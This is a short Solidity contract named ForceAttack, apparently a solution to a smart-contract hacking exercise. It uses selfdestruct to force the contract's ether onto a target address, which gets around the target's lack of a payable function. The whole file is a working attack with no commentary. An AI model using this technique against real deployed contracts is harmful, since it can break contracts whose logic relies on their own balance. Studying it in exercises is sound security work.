// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttack {
    function attack(address payable addr) public payable {
        selfdestruct(addr);
    }
}
